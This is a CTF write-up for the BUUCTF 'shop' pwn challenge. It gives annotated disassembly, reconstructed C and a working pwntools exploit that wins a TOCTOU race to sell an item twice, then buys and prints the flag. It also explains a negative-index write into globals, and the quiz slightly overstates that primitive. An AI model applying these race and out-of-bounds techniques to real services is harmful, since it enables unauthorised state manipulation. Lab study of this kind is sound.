# CTF Writeup: shop (BUUCTF) — Race Condition + OOB Index

Gantosay

## Challenge Overview

**Platform:** BUUCTF **Category:** PWN **Difficulty:** Easy **Architecture:** x86-64 (ELF 64-bit) **Vulnerability Classes:** Race Condition (TOCTOU) + Out-of-Bounds Array Index

This challenge simulates a shop where you start with 100 coins and can buy/sell items. The flag costs 200 coins — more than you have. The intended solution exploits a **race condition** in the multi-threaded sell logic to duplicate coins, then reads the in-memory flag via the `look` function.

No shell needed. No return address corruption. Pure logic-level exploit.

## Recon

```bash
file shop
# shop: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

checksec --file=shop
# Arch:    amd64-64-little
# RELRO:   Partial RELRO
# Stack:   Canary found        ← stack overflow is off the table
# NX:      NX enabled          ← no shellcode on stack
# PIE:     No PIE (0x400000)   ← fixed addresses, great for us
# Stripped: No                 ← symbols intact

nm -C ./shop | grep " T "
# buy, sale, to_buy, to_sale, look, game, init, read_n, read_int, main

strings -t x ./shop | grep bin/sh
# (no output) ← no /bin/sh string, no easy system() win
```

**What this tells us:**

- Canary → forget stack smashing
- No PIE → all global variables and GOT entries are at fixed, predictable addresses
- `pthread_create` in the PLT → this binary is **multi-threaded**; that's the first red flag
- No `/bin/sh` anywhere → this is not a ret2win challenge; the goal is reading `/flag` from memory
- Binary is not stripped → function names are intact, making disassembly much easier

## Binary Analysis: Assembly Deep Dive

### Global Memory Layout (fixed, No PIE)

```
0x6020a0  <money>      — int, starts at 100
0x6020c0  <bag>        — int[16], each slot: 0=empty 1=flag 2=pen 3=wish
0x6022a0  <flag_buf>   — char[0x30], filled from /flag at startup
```

These addresses never change. This is crucial for the OOB indexing bug.

---

### `init()` — Reading the Flag into Memory

```asm
400a63:  call   open@plt          ; open("/flag", O_RDONLY)
400a6d:  mov    %eax,-0x4(%rbp)   ; store fd
400a78:  mov    $0x6022a0,%esi    ; destination = flag_buf
400a73:  mov    $0x30,%edx        ; read 48 bytes
400a7f:  call   read@plt          ; read(fd, flag_buf, 0x30)
400a89:  call   close@plt         ; close(fd)
```

The flag content is loaded into `flag_buf` at `0x6022a0` **before the game loop starts**. It stays there in memory for the lifetime of the process — we just need to trigger the print.

---

### `look()` — How the Flag Gets Printed

```asm
400b35:  mov    -0x4(%rbp),%eax        ; i (loop counter)
400b3a:  mov    0x6020c0(,%rax,4),%eax ; eax = bag[i]  (address = 0x6020c0 + i*4)
400b41:  cmp    $0x1,%eax             ; if bag[i] == 1 (flag type):
400b44:  je     400b5d

400b5d:  mov    $0x6022a0,%edx        ; arg3 = flag_buf
400b67:  mov    $0x40108a,%edi        ; format = "[%02d]: flag -> %s\n"
400b71:  call   printf@plt            ; prints the flag!
```

Conclusion: **if any `bag[i] == 1`, `look()` prints the raw flag bytes from memory.** This is our win condition.

---

### `to_sale()` — The Vulnerable Thread Function

This function runs in a **new thread** spawned by `sale()`. Here is the full assembly, annotated:

```asm
; Function argument: rdi = slot index (passed as void*)
400d67:  mov    %edi,-0x4(%rbp)         ; save slot to stack

; Step 1: look up what type of item is in this slot
400d6a:  mov    -0x4(%rbp),%eax
400d6f:  mov    0x6020c0(,%rax,4),%eax  ; eax = bag[slot]

; Step 2: branch on item type
400d76:  cmp    $0x1,%eax               ; is it flag (type 1)?
400d79:  je     400d82
400d7b:  cmp    $0x2,%eax               ; is it pen (type 2)?
400d7e:  je     400d98
400d80:  jmp    400dae                  ; else: error + exit

; Branch for type 1 (flag): money += 100
400d82:  mov    0x60214c,%edx           ; recycle price of flag = 100
400d88:  mov    0x6020a0,%eax           ; eax = money
400d8e:  add    %edx,%eax               ; eax = money + 100
400d90:  mov    %eax,0x6020a0           ; money = money + 100
400d96:  jmp    400dc7

; Branch for type 2 (pen): money += 99
400d98:  mov    0x602164,%edx           ; recycle price of pen = 99
400d9e:  mov    0x6020a0,%eax           ; eax = money
400da4:  add    %edx,%eax               ; eax = money + 99
400da6:  mov    %eax,0x6020a0           ; money = money + 99

; THE DELAY — this is where the race window opens
400dc7:  mov    $0xc350,%edi            ; 0xc350 = 50000 microseconds = 50ms
400dcc:  call   usleep@plt              ; sleep(50ms)

; THE VULNERABLE WRITE — happens 50ms AFTER the money update
400dd6:  movl   $0x0,0x6020c0(,%rax,4) ; bag[slot] = 0  ← clears the slot
```

**The critical observation:** money is updated **immediately**, but the slot is only cleared **50 milliseconds later**. The main thread is not blocked during this delay.

---

### `sale()` — No Bounds Check on Index

```asm
400e0f:  call   read_int            ; index = read_int() — user-controlled
400e14:  mov    %eax,-0x14(%rbp)    ; store it

; Check: is bag[index] non-zero?
400e1c:  mov    0x6020c0(,%rax,4),%eax  ; eax = *(0x6020c0 + index*4)
                                        ; NO bounds check! index can be negative!
400e23:  test   %eax,%eax
400e25:  jne    400e33               ; if non-zero, proceed to sell

; Sell path: spawn a thread running to_sale(index)
400e38:  mov    %rax,%rdx           ; arg: the index
400e42:  mov    $0x400d5f,%edx      ; function pointer = to_sale
400e4f:  call   pthread_create@plt  ; create thread — NO pthread_join after!
400e54:  call   puts@plt            ; immediately prints "Fair prices!"
; ← returns to game loop with no waiting
```

**Two bugs visible here:**

1. `index` is never validated — it can be any integer, including negative
2. After `pthread_create`, there is no `pthread_join` — the main thread returns instantly to the menu while `to_sale` is still running in the background

## Bug #1 — Race Condition (TOCTOU)

**TOCTOU = Time Of Check To Time Of Use**

The check ("is this slot occupied?") and the use ("clear the slot") are separated by a 50ms `usleep`. The main thread is not blocked during this window.

### Timeline of the Race

```
Main thread                         Background thread (to_sale)
─────────────────────────────────   ─────────────────────────────────
sale() → index=0
  bag[0] != 0 ✓ (pen is there)
  pthread_create(to_sale, 0)
  puts("Fair prices!")
  return to game menu             → money += 99   (money = 199)
                                  → usleep(50000)  ← 50ms gap!
sale() → index=0
  bag[0] != 0 ✓ (still pen!      ← bag[0] NOT cleared yet!
                 thread hasn't
                 reached that line)
  pthread_create(to_sale, 0)
  puts("Fair prices!")           → money += 99   (money = 298)
  return to game menu
                                  → bag[0] = 0  (first thread finally clears)
                                  → bag[0] = 0  (second thread clears again)
```

**Result:** We sold the same item twice. `money` went from 100 → 199 → 298. Now we can afford the flag (cost: 200).

### Why the naive approach fails

If we write:

```python
sale(0)
sale(0)   # too late — 50ms already passed
```

The `recvuntil` calls in the first `sale()` function block the Python process long enough that by the time we send the second `sale`, the background thread has already cleared `bag[0]`. The check `bag[0] != 0` fails and we get "R U kidding me?".

### The fix: send all inputs in one burst

By sending all four bytes to stdin **without waiting for responses**, both `sale` calls reach the binary nearly simultaneously — well within the 50ms window:

```python
p.recvuntil(b'> ')   # wait for the very first prompt only
p.sendline(b'3')     # select "sale"
p.sendline(b'0')     # sell slot 0
p.sendline(b'3')     # select "sale" again — arrives before 50ms expire
p.sendline(b'0')     # sell slot 0 again
```

The OS buffers these writes. The binary reads them sequentially but nearly instantly, so both `pthread_create` calls happen before the first thread's `usleep` finishes.

## Bug #2 — Out-of-Bounds Array Index

This bug exists independently of the race condition. It was not needed for this specific exploit, but understanding it is important.

### The Vulnerability

`bag` is declared as `int bag[16]`, occupying addresses `0x6020c0` through `0x6020ff` (16 × 4 bytes).

When `sale()` computes `bag[index]`:

```asm
mov 0x6020c0(,%rax,4),%eax   ; eax = *(0x6020c0 + rax * 4)
```

`rax` comes directly from user input with **zero bounds validation**. The accessed address is:

```
target_address = 0x6020c0 + index × 4
```

For `index = -8`:

```
target_address = 0x6020c0 + (-8 × 4)
               = 0x6020c0 - 0x20
               = 0x6020a0   ← exactly &money
```

### What `to_sale` Does With a Negative Index

If we pass `index = -8` to `sale()`, `to_sale(-8)` runs and:

1. Reads `bag[-8]` → reads the current value of `money` (e.g. 100)
2. If `money == 2` (type pen) or `money == 1` (type flag), adds recycle price
3. After 50ms: `bag[-8] = 0` → **writes 0 directly into `money`**

This gives us a **zero-write-anywhere primitive**: we can set any 4-byte global variable to 0, as long as we can calculate the correct negative index.

### Why It Wasn't Needed Here

The race condition alone was sufficient to reach 200+ coins. The OOB index would be useful in a harder version of this challenge where:

- We needed to zero out a price to buy something for free
- Or zero out a counter/lock variable to bypass some check

In a more advanced exploit chain, combining OOB write (zero-write) with race condition could yield full arbitrary write with enough creativity.

## Reconstructed C Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>

/* ── Global variables (fixed addresses, No PIE) ── */
int   money     = 100;     // 0x6020a0
int   bag[16];             // 0x6020c0  — 0=empty 1=flag 2=pen 3=wish
char  flag_buf[0x30];      // 0x6022a0  — raw /flag content

typedef struct {
    int   price;    // what you pay to buy
    int   recycle;  // what you get when you sell
    char  name[16];
} Item;

Item items[] = {
    {  0,   0, ""     },  // index 0: unused
    {200, 100, "flag" },  // index 1
    {100,  99, "pen"  },  // index 2
    { 50,   0, "wish" },  // index 3
};

/* ── init: load /flag into memory ── */
void init(void) {
    int fd = open("/flag", O_RDONLY);
    read(fd, flag_buf, 0x30);  // flag lives at 0x6022a0 forever
    close(fd);
    setbuf(stdout, NULL);
    setbuf(stdin,  NULL);
}

/* ── look: print all bag slots; prints flag if slot type == 1 ── */
void look(void) {
    for (int i = 0; i < 16; i++) {
        int type = bag[i];
        if      (type == 1) printf("[%02d]: flag -> %s\n", i, flag_buf); // WIN
        else if (type == 2) printf("[%02d]: pen\n",  i);
        else if (type == 3) printf("[%02d]: wish\n", i);
        else if (type == 0) printf("[%02d]: NULL\n", i);
        else { printf("Oops???"); exit(0); }
    }
    printf("your money: %d\n", money);
}

/* ── to_sale: runs in a background thread ── */
void *to_sale(void *arg) {
    int slot = (int)(long)arg;  // NO bounds check inherited from caller

    int type = bag[slot];       // BUG: slot can be negative → OOB read
    if      (type == 1) money += items[1].recycle;  // +100
    else if (type == 2) money += items[2].recycle;  // +99
    else { printf("Oops???"); exit(0); }

    usleep(50000);              // BUG: 50ms gap between money update and slot clear
                                //      ← TOCTOU race window is HERE

    bag[slot] = 0;              // BUG: with negative slot this writes outside bag
    return NULL;
}

/* ── sale: BUG — no bounds check on index ── */
void sale(void) {
    printf("Which one?\n> ");
    int slot = read_int();          // user input, unchecked

    if (bag[slot] != 0) {          // BUG: slot can be -8 → reads &money instead
        pthread_t tid;
        pthread_create(&tid, NULL, to_sale, (void*)(long)slot);
        // NO pthread_join — main thread returns immediately!
        puts("Fair prices!");
    } else {
        puts("R U kidding me?");
    }
}

/* ── to_buy / buy: standard purchase logic (threads, no race here) ── */
void *to_buy(void *arg) {
    int item = (int)(long)arg;
    money -= items[item].price;
    for (int i = 0; i < 16; i++)
        if (bag[i] == 0) { bag[i] = item; break; }
    return NULL;
}

void buy(void) {
    printf("Which one?\n> ");
    int choice = read_int();
    if (choice < 1 || choice > 3) return;
    if (items[choice].price > money) { puts("Poor bastard!"); return; }
    if (choice == 3) { money -= 50; puts("God bless you"); return; }
    pthread_t tid;
    pthread_create(&tid, NULL, to_buy, (void*)(long)choice);
    puts("Thank you for your patronage~");
}

int main(void) {
    init();
    game();   // infinite menu loop calling look/buy/sale
}
```

## Exploit Development

### Step-by-step Plan

```
Step 1: Race condition on slot 0 (pen)
        money: 100 → 199 → 298

Step 2: Buy flag (item 1, costs 200)
        money: 298 - 200 = 98
        bag[1] = 1 (flag type)

Step 3: Call look()
        bag[1] == 1 → printf("[01]: flag -> %s", flag_buf)
        flag_buf contains the real flag from /flag
```

### Final Exploit

```python
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

if len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    p = remote(host, int(port), ssl=True, sni=host)
else:
    p = process('./shop')

def buy(item):
    """Navigate the buy menu: option 2, then item number."""
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(str(item).encode())

def look():
    """Navigate the look menu: option 1."""
    p.recvuntil(b'> ')
    p.sendline(b'1')

# ── Step 1: Race Condition ──────────────────────────────────────────────
# Wait for the very first menu prompt, then flood stdin with two sale
# sequences back-to-back — no recvuntil between them so both arrive
# inside the 50ms usleep window in to_sale().

p.recvuntil(b'> ')
p.sendline(b'3')    # menu option: sale
p.sendline(b'0')    # sell slot 0 (pen) — thread 1 spawned, money += 99
p.sendline(b'3')    # menu option: sale  ← arrives before thread 1 clears bag[0]
p.sendline(b'0')    # sell slot 0 again  — thread 2 spawned, money += 99

# money is now 100 + 99 + 99 = 298

# ── Step 2: Buy the flag ────────────────────────────────────────────────
buy(1)              # costs 200; money: 298 → 98; bag[some slot] = 1

# ── Step 3: Print the flag ──────────────────────────────────────────────
look()              # look() sees bag[slot] == 1 → prints flag_buf

p.interactive()
```

### Expected Output (local)

```
[01]: flag ->          ← empty locally (no /flag file)
your money: 98
```

### Expected Output (remote)

```
[01]: flag -> flag{race_condition_toctou_xxxx}
your money: 98
```

### Running Against the Server

```bash
python3 exp.py IP:PORT
```

## Key Takeaways

### 1. Race Condition (TOCTOU) in Multi-threaded Programs

Whenever you see `pthread_create` **without** a matching `pthread_join`, ask: what shared state does the spawned thread modify, and is there a delay between the check and the actual write? If yes — you likely have a race window to exploit.

The pattern:

```
check(shared_state)        ← Time Of Check
... delay ...              ← the window
modify(shared_state)       ← Time Of Use
```

### 2. `recvuntil` Kills Your Race

When timing matters, **batch your sends**. Waiting for server responses between inputs adds latency that will close your race window. Send everything at once, collect output later.

### 3. Out-of-Bounds Array Index on Globals

An unchecked array index into a **global** array (not on the stack) is fundamentally different from a stack buffer overflow:

- It's not about writing past a buffer contiguously
- It's about using arithmetic to **aim at any address relative to the array base**
- Formula: `target = array_base + index × element_size`
- Negative index → access memory **before** the array (lower addresses)
- This is an arbitrary read/write primitive limited only by what you can calculate

### 4. Not Every PWN Challenge Needs a Shell

This binary already reads `/flag` into memory at startup. The win condition is simply triggering a print of that memory — no code execution needed. Always read the binary's full logic before assuming you need RCE.

### 5. Canary + NX ≠ Invincible

This binary had both Canary and NX enabled — two protections that shut down classic stack exploitation. But the vulnerability was in the **application logic** (threading + missing bounds check), not in memory layout. Mitigations protect specific attack surfaces; they don't make logic bugs disappear.

## Quiz

Test your understanding of this challenge.

---

**Q1.** `to_sale()` calls `usleep(0xc350)`. What is that in milliseconds, and why does its exact value matter to the exploit?

> **A:** `0xc350 = 50000` microseconds = **50ms**. The value defines the width of the race window. A larger value makes the race easier to win (more time between check and clear). A smaller value would require faster input delivery or a different technique.

---

**Q2.** Why does `sale()` have an OOB index bug but `buy()` does not?

> **A:** `buy()` explicitly validates the input: `if (choice != 1 && choice != 2 && choice != 3) return;` — only values 1, 2, 3 are accepted. `sale()` reads a slot index and passes it directly to `bag[index]` with no range check whatsoever.

---

**Q3.** If `bag` starts at `0x6020c0` and `money` is at `0x6020a0`, what index would you pass to `sale()` to make `to_sale` write 0 into `money`? Show your calculation.

> **A:**
>
> ```
> target  = 0x6020a0
> base    = 0x6020c0
> offset  = 0x6020a0 - 0x6020c0 = -0x20 = -32 bytes
> index   = -32 / 4 = -8
> ```
>
> Pass `index = -8` to `sale()`. After the 50ms delay, `to_sale` writes 0 to `bag[-8]` which resolves to `&money`. Result: `money = 0`.

---

**Q4.** Why does inserting a `p.recvuntil(b'> ')` between the two `sale` sends break the exploit?

> **A:** `recvuntil` blocks the Python process until the server sends ` >  `. The server only sends that after printing the full menu — which takes longer than 50ms over even a local socket. By the time the second `sale` is sent, the background thread has already executed `bag[0] = 0`, so the second check `bag[0] != 0` fails.

---

**Q5.** This binary has Canary and NX enabled. Why were those protections completely irrelevant to this exploit?

> **A:** Canary protects against stack buffer overflows by detecting corruption of the saved return address. NX prevents executing shellcode on the stack. This exploit never overflows any buffer and never injects code — it purely manipulates **application-level state** (coin balance via race condition) to purchase an item whose display routine prints a flag already loaded in memory. Hardware mitigations only cover the attack surfaces they were designed for.
